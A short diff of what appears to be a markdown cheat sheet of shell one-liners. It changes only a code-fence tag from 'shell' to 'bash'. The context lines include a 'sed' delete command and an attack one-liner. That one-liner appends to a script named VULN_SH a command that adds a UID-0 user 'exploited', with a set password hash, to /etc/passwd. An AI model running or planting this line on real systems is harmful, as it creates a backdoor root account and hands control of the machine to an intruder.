@@ -105,7 +105,7 @@ Delete last line from a file in place:
 sed -i '$d' <file>
 ```
 
-```shell
+```bash
 echo "echo \"exploited:\\\$1\\\$somesalt\\\$zl7ghhyb/ddzu8Jlo.q4b1:0:0::/root/bin/bash\" >> /etc/passwd" >> VULN_SH
 ```
 
